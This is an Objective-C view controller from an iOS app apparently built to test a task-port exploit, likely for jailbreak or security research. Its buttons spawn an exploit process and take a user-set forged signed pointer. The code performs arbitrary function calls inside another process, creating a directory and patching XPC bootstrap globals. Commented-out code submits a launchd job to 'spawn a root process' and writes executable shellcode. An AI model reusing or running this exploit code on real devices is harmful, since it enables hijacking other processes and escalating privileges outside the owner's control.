//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import XPC;
#import "ViewController.h"
#include "Header.h"
#include <sys/wait.h>


@interface ViewController ()
@property(nonatomic) mach_port_t exceptionPort;
@property(nonatomic) pid_t childPid, sleepPid;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.title = @"Task Port Haxx";
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Ptr" style:UIBarButtonItemStylePlain target:self action:@selector(changePtrTapped)];
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
    ];
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    self.exceptionPort = setup_exception_server();
    self.childPid = -1;
    //self.sleepPid = spawn_sleep_process();
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)changePtrTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Change Signed Pointer" message:@"Enter new signed pointer and diversifier value (hex):" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Signed Pointer (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%lx", NSUserDefaults.standardUserDefaults.signedPointer];
    }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Diversifier (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%x", NSUserDefaults.standardUserDefaults.signedDiversifier];
    }];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        UITextField *textField = alert.textFields.firstObject;
        NSUInteger signedPointer = strtoull(textField.text.UTF8String, NULL, 16);
        uint32_t diversifier = (uint32_t)strtoul(alert.textFields[1].text.UTF8String, NULL, 16);
        NSUserDefaults.standardUserDefaults.signedPointer = signedPointer;
        NSUserDefaults.standardUserDefaults.signedDiversifier = diversifier;
        printf("Set signed pointer to 0x%lx\n", signedPointer);
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:okAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)testButtonTapped {
    if (getpgid(_childPid) > 0) {
        printf("Child already spawned with PID %d\n", self.childPid);
        return;
    }
    self.childPid = spawn_exploit_process(self.exceptionPort);
}

- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        //RemoteArbCall(atexit, 0x41414100);
        
        vm_address_t map = RemoteArbCall(mmap, 0, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
        RemoteWriteString(map, "/tmp/.it_works");
        RemoteArbCall(mkdir, map, 0700);
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
        RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
        mach_port_t remote_bootstrap_port = RemoteRead32(map);
        RemoteWriteString(map, "_os_alloc_once_table");
        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(dlsym, (uint64_t)RTLD_DEFAULT, map);
        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
        printf("Waiting 5 seconds before detach...\n");
        sleep(5);
        RemoteDetach();
        
        /*
        // Now we can submit a launch job
        vm_address_t root = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
        vm_address_t submitJob = RemoteArbCall(xpc_dictionary_create, 0, 0, 0);
        
        RemoteWriteString(map, "LaunchOnlyOnce");
        RemoteArbCall(xpc_dictionary_set_bool, submitJob, map, true);
        RemoteWriteString(map, "ExitTimeOut");
        RemoteArbCall(xpc_dictionary_set_int64, submitJob, map, 30);
        RemoteWriteString(map, "POSIXSpawnType");
        RemoteWriteString(map+0x100, "Interactive");
        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
        RemoteWriteString(map, "Label");
        RemoteWriteString(map+0x100, "com.apple.dt.instruments.dtsecurity.haxx");
        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
        RemoteWriteString(map, "Program");
        RemoteWriteString(map+0x100, "/System/Library/PrivateFrameworks/DVTInstrumentsFoundation.framework/XPCServices/com.apple.dt.instruments.dtsecurity.xpc/com.apple.dt.instruments.dtsecurity");
        RemoteArbCall(xpc_dictionary_set_string, submitJob, map, map+0x100);
        
        RemoteWriteString(map, "SubmitJob");
        
        printf("Waiting 5 seconds before xpc_dictionary_set_value...\n");
        sleep(5);
        RemoteArbCall(xpc_dictionary_set_value, root, map, submitJob);
        
        //RemoteArbCall(xpc_release, submitJob);
        
        printf("Submitting launch job...\n");
        RemoteArbCall(_launch_msg2, root, 3, 0);
        */
        
        //RemoteArbCall(munmap, map, 0x4000);
        
        
//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(mkdir, map, 0700);
        
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(((uint64_t (*)(void))map));
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RemoteDetach();
    });
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

@end

@implementation NSUserDefaults(Pref)
- (void)setSignedPointer:(NSUInteger)signedPointer {
    [self setObject:@(signed_pointer = signedPointer) forKey:@"signedPointer"];
}
- (NSUInteger)signedPointer {
    return signed_pointer = [[self objectForKey:@"signedPointer"] unsignedIntegerValue];
}
- (void)setSignedDiversifier:(uint32_t)signedDiversifier {
    [self setObject:@(signedDiversifier) forKey:@"signedDiversifier"];
}
- (uint32_t)signedDiversifier {
    return [[self objectForKey:@"signedDiversifier"] unsignedIntValue];
}
@end
